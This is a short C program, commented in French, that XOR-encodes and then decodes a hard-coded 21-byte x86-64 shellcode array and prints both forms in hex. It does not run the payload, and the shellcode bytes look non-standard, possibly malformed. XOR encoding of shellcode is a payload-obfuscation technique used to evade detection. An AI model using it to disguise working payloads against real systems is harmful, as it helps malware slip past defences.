#include <stdio.h>
#include <string.h>
#include <stddef.h> // Pour size_t

// Définir la vraie longueur du tableau de bytes.
#define SHELLCODE_LEN 21

// Fonction pour encoder/decoder avec XOR (Optimisée et Robuste)
void xor_encode_optimized(char *data, const char *key, size_t len) {
    // Calcul de la longueur de la clé une seule fois pour l'efficacité (O(1) dans la boucle)
    size_t key_len = strlen(key); 

    if (key_len == 0) {
        fprintf(stderr, "Erreur : La clé ne peut pas être vide.\n");
        return;
    }

    // Utilisation de size_t pour l'indice de la boucle
    for (size_t i = 0; i < len; i++) {
        data[i] ^= key[i % key_len];
    }
}

// Fonction pour afficher les bytes au format hexadécimal
void print_hex(const char *data, size_t len) {
    for (size_t i = 0; i < len; i++) {
        printf("\\x%02x", (unsigned char)data[i]);
    }
    printf("\n");
}

int main() {
    // Shellcode original (21 octets)
    char shellcode[] = "\x31\xc0\x48\xbb\xd1\x9a\xe8\x46\x0c\x00\x00\x53\x54\x5f\x52\x57\x59\x41\x50\x0f\x05";
    char key[] = "maClé";
    
    // CORRECTION CRITIQUE : Utiliser la longueur correcte définie manuellement
    size_t len = SHELLCODE_LEN; 

    printf("Longueur du shellcode (Corrigée) : %zu octets\n", len);

    // --- Chiffrement ---
    xor_encode_optimized(shellcode, key, len);

    // Afficher le shellcode chiffré (21 octets)
    printf("Shellcode chiffré : ");
    print_hex(shellcode, len);

    // --- Déchiffrement ---
    xor_encode_optimized(shellcode, key, len);

    // Afficher le shellcode décodé (qui devrait correspondre à l'original)
    printf("Shellcode décodé : ");
    print_hex(shellcode, len);

    return 0;
}
